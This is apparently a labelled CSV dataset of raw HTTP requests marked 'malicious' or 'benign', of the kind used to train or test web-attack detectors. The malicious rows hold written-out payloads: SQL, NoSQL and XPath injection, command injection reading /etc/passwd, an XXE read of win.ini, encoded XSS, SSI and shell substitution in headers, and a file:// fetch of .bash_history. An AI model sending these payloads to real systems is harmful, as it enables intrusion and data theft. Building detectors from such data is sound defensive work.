label,text
malicious,"POST /data/query HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: application/json, text/plain, */*
Content-Type: application/json
Content-Length: 187
Referer: https://my-personal-blog-site.info/dashboard
Connection: keep-alive

{""query"":{""$where"":""this.account === 'admin' &amp;&amp; this.pwd.startsWith('a') || sleep(2500)""},""fields"":{""email"":1,""username"":1}}"
benign,"GET /product/cyclotech-speedster-mountain-bike-2024 HTTP/1.1
Host: urbanride-sports.ai
Connection: close
Accept: text/html
Accept-Language: en-GB,en;q=0.6
Referer: https://urbanride-sports.ai/categories/bikes
Cookie: session=bbf45619c3e2bf4e79ea2bde7e712ea1; cart=8d56f1847e2034abb7d2
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
malicious,"PUT /api/v1/account/settings HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/json
Content-Length: 104
Accept: application/json
User-Agent: Python-urllib/3.9
X-CSRF-Token: b92d9f210a964eb48df8d2367b9f44ae

{""displayName"": ""Lara_Croft"", ""statusMessage"": ""Happy to be here' Or 'x'='x""}"
malicious,"GET /admin/run_backup_script.sh?host=10.0.0.15%3B%20cat%20%2Fetc%2Fpasswd HTTP/1.1
Host: secure-file-storage.io
User-Agent: curl/7.77.0
Accept: */*
Connection: close"
benign,"GET /admin/users/list?filter[type]=admin&filter[active]=true HTTP/1.1
Host: enterprise-portal.io
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:111.0) Gecko/20100101 Firefox/111.0
Accept: application/json
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: https://enterprise-portal.io/admin/login
X-Forwarded-For: 192.168.10.25"
benign,"POST /signup-new HTTP/1.1
Host: api.cloud-data-services.ai
Content-Type: application/x-www-form-urlencoded
Content-Length: 108
Referer: https://api.cloud-data-services.ai/signup-new
Origin: https://api.cloud-data-services.ai
Cookie: sessionToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
DNT: 1
Connection: keep-alive

username=elena_ross&email=elena.ross%40mailservice.org&password=GreenTree84&password_confirm=GreenTree84&terms_accepted=true"
malicious,"GET /api/v3/items/search?query=laptop&query=gaming&id=123&filter_evil_chars=true&id=%27%20UNION%20SELECT%20credit_card%20FROM%20users-- HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: application/json, text/plain, */*
Accept-Encoding: gzip, deflate, br
Cache-Control: max-age=0
Origin: https://api.cloud-data-services.ai
Referer: https://api.cloud-data-services.ai/docs
Connection: keep-alive"
benign,"POST /user/docs/upload HTTP/1.1
Host: api.cloud-documents.ai
Connection: keep-alive
Accept: application/json
User-Agent: curl/7.79.1
Content-Type: multipart/form-data; boundary=----Boundary123456789
Content-Length: 2467
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9

------Boundary123456789
Content-Disposition: form-data; name=""project_id""

proj_47682
------Boundary123456789
Content-Disposition: form-data; name=""document""; filename=""research_notes.pdf""
Content-Type: application/pdf

%PDF-1.5
%Research notes placeholder content.
------Boundary123456789
Content-Disposition: form-data; name=""confidential""

false
------Boundary123456789--"
benign,"POST /survey/submit_vote HTTP/1.1
Host: online-anime-community.info
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 20
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:102.0) Gecko/20100101 Firefox/102.0
Referer: https://online-anime-community.info/survey
Accept-Encoding: gzip, deflate
Cookie: session_token=ab12xyz890pkj45mnq

poll_id=18&vote_option=2"
benign,"POST /forums/discussion/1245/comment_reply HTTP/1.1
Host: openrealm-gaming.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 175
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Referer: https://openrealm-gaming.net/forums/discussion/1245
Origin: https://openrealm-gaming.net
Cookie: session_token=d438bc78def0997a2214e35fe90bb06a; csrf_id=f68640f0382049eeaa0a8731d2e8bf88
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.92 Mobile Safari/537.36

author_name=Ben+Torres&comment_text=Really+love+the+community+here+and+the+helpful+responses.+Keep+it+up!&parent_id=9821&csrf_id=f68640f0382049eeaa0a8731d2e8bf88"
benign,"PUT /profile/settings HTTP/1.1
Host: swift-finance-app.co
User-Agent: python-requests/2.28.2
Content-Type: application/json
Accept-Encoding: gzip, deflate
Content-Length: 61
Connection: keep-alive

{""bio"": ""Financial analyst &lt;b&gt;keen on data&lt;/b&gt; and cryptos""}"
benign,"POST /api/accounts/create HTTP/1.1
Host: financecloud.my-personal-blog-site.info
Authorization: Bearer 83920d01-11ed-4fb7-afc1-b8f170c57afe
Content-Type: application/xml
Accept: application/xml
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Content-Length: 242
Connection: keep-alive

<?xml version=""1.0"" encoding=""UTF-8""?>
<Account>
  <OwnerName>Lucas Meyer</OwnerName>
  <AccountType>Checking</AccountType>
  <Currency>USD</Currency>
  <InitialDeposit>1500.00</InitialDeposit>
  <Email>lucas.meyer@financecloud.my-personal-blog-site.info</Email>
</Account>"
benign,"GET /user/profile/view?id=1024&tab=activity HTTP/1.1
Host: secure-user-portal.net
Connection: keep-alive
Accept: application/json, text/javascript, */*; q=0.01
X-CSRF-Token: lc2R7S9zKhrAmD5fQ93DoE1xGLv6ZgYMTM9b4aWc
Cookie: sessionid=7f64f488a3a1298c5b19c745d14ca1fe; preferences=lang=en; theme=dark
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko
Accept-Language: en-US,en;q=0.5
Cache-Control: max-age=0"
benign,"GET /discussions/thread/view?comment=This%20is%20%26lt%3Bbold%26gt%3B HTTP/1.1
Host: forum-digital-artspace.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Referer: https://forum-digital-artspace.io/discussions/thread/list
Upgrade-Insecure-Requests: 1"
malicious,"POST /api/v1/postMessage HTTP/1.1
Host: online-retail-store.biz
Content-Type: application/json
Content-Length: 154
Accept: application/json
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1

{""user"":""shopper_88"",""message"":""Loved the product! Also, see this: \u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0061\u006c\u0065\u0072\u0074\u0028\u0027\u0058\u0053\u0053\u0027\u0029""}"
benign,"GET /fitness/tracker/stats?range=weekly HTTP/1.1
Host: fit-active-hub.io
Accept: application/json
Accept-Language: en-US,en;q=0.9
Accept-Encoding: br, gzip, deflate
Connection: keep-alive
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1
X-CSRF-Token: 1f2e3d4c5b6a7e8f9d0c"
benign,"GET /api/v3/events/search?keyword=%4a%5b%6C%7d&location=NewYork HTTP/1.1
Host: api.cloud-data-services.ai
Accept: application/json
User-Agent: Bingbot/2.0
Accept-Encoding: gzip, deflate
Cache-Control: no-cache
Via: 1.1 api-gateway.cloud
Connection: close"
benign,"HEAD /blog/technology/quantum-computing-basics HTTP/1.1
Host: tech-savvy-hub.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15
Accept: text/html
Accept-Encoding: gzip, deflate, br
Referer: https://tech-savvy-hub.net/blog
Connection: close"
benign,"GET /fetch?url=https%3A%2F%2Fcommunity.game-dev-forum.org%2Fthread%2F3429%2Fpage%2F2 HTTP/1.1
Host: api.game-dev-forum.org
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
Connection: keep-alive
Accept-Language: en-GB,en;q=0.7
Accept-Encoding: br, gzip, deflate
Cache-Control: max-age=0"
benign,"GET /resource/load?path=assets/css/main.css HTTP/1.1
Host: assets-hub-cloud.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
Accept: text/css,*/*;q=0.1
Accept-Language: en-US,en;q=0.9
Connection: keep-alive"
benign,"GET /community/game-dev-forum.org/thread/view/4321?highlight=%4a%5b%6C%7d HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.9
Referer: https://community.game-dev-forum.org/forum/general
Connection: keep-alive"
malicious,"POST /upload/processDocument HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Referer: https://dashboard.api.cloud-data-services.ai/uploader
Origin: https://dashboard.api.cloud-data-services.ai
Content-Type: multipart/form-data; boundary=----MyBoundary12345Abc
Content-Length: 410
Connection: keep-alive

------MyBoundary12345Abc
Content-Disposition: form-data; name=""description""

Configuration import for user request 90876
------MyBoundary12345Abc
Content-Disposition: form-data; name=""file""; filename=""config.xml""
Content-Type: application/xml

<?xml version=""1.0""?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///c:/windows/win.ini"">]>
<config>&xxe;</config>
------MyBoundary12345Abc--"
malicious,"GET /content/article/view?id=312 HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15 <!--#config errmsg=""SSI_Fatal_Error_404""-->
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Cache-Control: no-cache
X-Requested-With: XMLHttpRequest
Referer: https://community.game-dev-forum.org/home"
benign,"PUT /api/v1/profile/update HTTP/1.1
Host: user-data-sync.net
If-Match: ""3e86-59f8a4c9d7b50""
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiMzY1In0._Q8OtkT6uFmXhkQfBAzbgWjAsujFHzQPxeaS1E03T3s
Content-Length: 72

{""firstName"": ""Eleanor"", ""lastName"": ""Riggs"", ""preferences"": {""newsletter"": false}}"
benign,"POST /cast_vote HTTP/1.1
Host: engage-platform.ai
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded
Content-Length: 26
DNT: 1
Referer: https://engage-platform.ai/polls/908/vote
Connection: keep-alive

poll_id=908&choice_id=1"
benign,"GET /api/v1/customers?status=active&sort=joined_date HTTP/1.1
Host: api.secure-user-portal.net
Accept: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMjM0NSwiZXhwIjoxNjg1MzQ1NjAwfQ.d5fUuNEwYtLjRf_kqHKkVVDpmJPl7CtHJIyHdUdKHGs
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Connection: keep-alive"
malicious,"POST /api/v1/update HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: BlogUpdater/0.9 $(ls -la /tmp) Safari/604.1
Content-Type: application/json
Content-Length: 56
Accept: application/json

{""postId"":134,""content"":""Updated content for latest blog.""}"
benign,"GET /store/items?search=laptop+""ultrabook""+15%22+inch&colors=black%2Cred%2Cwhite HTTP/1.1
Host: techlandia.store
Accept: application/json, text/plain, */*
User-Agent: curl/7.86.0
Accept-Encoding: gzip"
benign,"POST /account/user/settings HTTP/1.1
Host: fitness-active-zone.club
Content-Type: application/x-www-form-urlencoded
Content-Length: 103
Connection: keep-alive
Origin: https://fitness-active-zone.club
Referer: https://fitness-active-zone.club/account/user/settings
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36
Cookie: fa_session=4c6397a0edb64e6dbc1a7c805fdfc3b2

display_name=Leo+Martinez&bio=Fitness+enthusiast+and+personal+trainer&website_url=https%3A%2F%2Fleofitness.zone&location=Austin%2C+TX"
benign,"GET /news/today/top-stories HTTP/1.1
Host: global-news-now.info
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.7
Cookie: session=2cb410f7a8; reader_prefs=font-size:16px;color-scheme:light; _ga=GA1.3.123456789.1682325600; visit_count=42
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Connection: keep-alive"
benign,"GET /api/v1/users?filter[type]=admin&filter[active]=true HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/7.86.0
Accept: application/json
X-Requested-With: XMLHttpRequest
Cache-Control: no-cache
Pragma: no-cache
Connection: close"
benign,"HEAD /about/team HTTP/1.1
Host: nextgen-cloud-solutions.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/114.0.1823.43 Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Connection: keep-alive"
benign,"OPTIONS /inventory/items/3fb39412 HTTP/1.1
Host: stock-control-service.biz
Origin: https://dashboard.order-entry.org
Access-Control-Request-Method: DELETE
Access-Control-Request-Headers: authorization
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: keep-alive"
benign,"PUT /v1/projects/4532/environment/provision HTTP/1.1
Host: nextgen-devops-tools.dev
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoibWFya19rb3UiLCJpYXQiOjE2ODE0NDQ2MDB9.R9dUzpY_eJ_M7qfDqxaNGmWVdKdSx2Hac7pMz3Qxxbw
Content-Type: application/json
Accept: application/json
DNT: 1
User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36
Content-Length: 372

{""provisionConfig"":{""instances"":[{""type"":""m5.large"",""count"":3,""tags"":{""env"":""staging"",""service"":""web""}},{""type"":""r5.xlarge"",""count"":2,""tags"":{""env"":""staging"",""service"":""db""}}],""network"":{""vpc"":""vpc-783b4f34"",""subnets"":[""subnet-1a2b3c"",""subnet-4d5e6f""]},""scaling"":{""autoScaling"":true,""minInstances"":2,""maxInstances"":6}}}"
malicious,"GET /proxy/file%3A%2F%2F%2Fhome/user/.bash_history HTTP/1.1
Host: education-platform-ai.net
User-Agent: Python-urllib/3.9
Accept: */*
Referer: https://education-platform-ai.net/course/intro
Connection: close"
benign,"POST /api/auth/v3/login HTTP/1.1
Host: users.auth-center.ai
Content-Type: application/json
Accept: application/json
Origin: https://users.auth-center.ai
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_3_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
X-Requested-With: FetchAPIClient
Content-Length: 92

{""email"":""nathaniel.green45@users.auth-center.ai"",""password"":""!GreenNV45login""}"
benign,"HEAD /files/large/ebook-reader-installer.dmg HTTP/1.1
Host: oss-distribution-network.dev
User-Agent: curl/7.87.0
Accept: */*
Connection: keep-alive"
benign,"OPTIONS /admin/v2/customers/4507 HTTP/1.1
Host: online-retail-store.biz
Origin: https://retail-analytics.panel
Access-Control-Request-Method: DELETE
Access-Control-Request-Headers: authorization, x-auth-token
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Connection: keep-alive"
benign,"GET /api/weather/data?id=1024&units=metric&lang=en HTTP/1.1
Host: weather-insights.cloud
Accept: application/json
User-Agent: curl/7.85.0
Range: bytes=0-512
Connection: keep-alive"
benign,"POST /data/upload/thumbnail HTTP/1.1
Host: media-cloud-sys.info
Authorization: Bearer A1B2C3D4E5F6G7H8I9J0
Content-Type: application/json
Accept: application/json
Referer: https://media-cloud-sys.info/dashboard
User-Agent: curl/7.86.0
Content-Length: 195
Connection: keep-alive

{""fileId"": ""7a9e8c6d"", ""imageData"": ""iVBORw0KGgoAAAANSUhEUgAAAAUA"", ""attributes"":{""width"":5,""height"":5,""format"":""png""}, ""uploadedAt"": ""2024-06-05T09:11:00Z""}"
benign,"DELETE /services/marketing/campaigns/77ea45 HTTP/1.1
Host: api.marketing-insights.ai
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
X-Confirm-Delete: true
User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Mobile Safari/537.36
Accept: application/json, text/plain
Connection: keep-alive"
benign,"PUT /user/preferences/theme HTTP/1.1
Host: community.game-dev-forum.org
Content-Type: application/json
If-Match: ""t2l9m5k8b7n3q4r1""
Connection: close
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGc...tokenstring...
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:112.0) Gecko/20100101 Firefox/112.0
Accept: application/json
Content-Length: 52

{""theme"":""cyberpunk"",""fontSize"":""medium"",""contrast"":""high""}"
benign,"GET /shop/products/search?category=books&category=stationery&category=electronics&sort=popularity HTTP/1.1
Host: variety-marketplace.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Connection: keep-alive"
malicious,"GET /query_documents?author_name=%27%20or%20//book[price%3E100]/title%20or%20%271%27%3D%271 HTTP/1.1
Host: secure-cloud-marketplace.io
User-Agent: Python-urllib/3.9
Accept: application/xml
Accept-Encoding: gzip
Connection: close"
benign,"POST /polls/42/vote HTTP/1.1
Host: city-survey-data.info
Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.7,en;q=0.5
Content-Length: 22
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0
Connection: keep-alive
Origin: https://city-survey-data.info
Cache-Control: no-cache

poll_id=42&choice_id=7"
benign,"POST /api/v3/items/search HTTP/1.1
Host: api.cloud-data-services.ai
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Accept: application/json, text/plain, */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/113.0
Origin: https://cloud-dashboard.cloud-data-services.ai
Referer: https://cloud-dashboard.cloud-data-services.ai/search
Accept-Language: en-GB,en;q=0.8
Content-Length: 56

query=machine+learning&filters=active&sort=rating_desc&limit=20"
benign,"GET /product/7543 HTTP/1.1
Host: ecohousewares.online
Connection: keep-alive
Accept: text/html
Accept-Language: en-US,en;q=0.8
Cookie: sid=bb831f3da2654281a0b98600977f5890; cart_id=53fbb1a8002f46df804236ae530d77c2
Referer: https://ecohousewares.online/home/kitchen
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0"
benign,"POST /admin/update_settings HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:110.0) Gecko/20100101 Firefox/110.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.7
Content-Type: application/x-www-form-urlencoded
Content-Length: 492
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.token.payload.signature
Connection: keep-alive
Cookie: csrftoken=abcdef1234567890abcdef1234567890

site_name=Secure+User+Portal&max_login_attempts=5&password_expiry_days=90&enable_2fa=true&session_timeout=15&support_email=support%40secure-user-portal.net&maintenance_mode=false&theme=modern&homepage_widgets=weather%2Clatest_news%2Ccalendar&analytics_enabled=true&user_registration=true&email_verification=true&default_language=en&timezone=UTC&api_access_enabled=true&max_api_requests_per_hour=1000&password_complexity=high&cookie_lifetime_days=30&log_retention_days=365&backup_frequency=daily&error_reporting_level=warn&captcha_enabled=true&max_concurrent_sessions=3&allowed_file_types=jpg%2Cpng%2Cpdf%2Cdocx&max_file_size_mb=15"
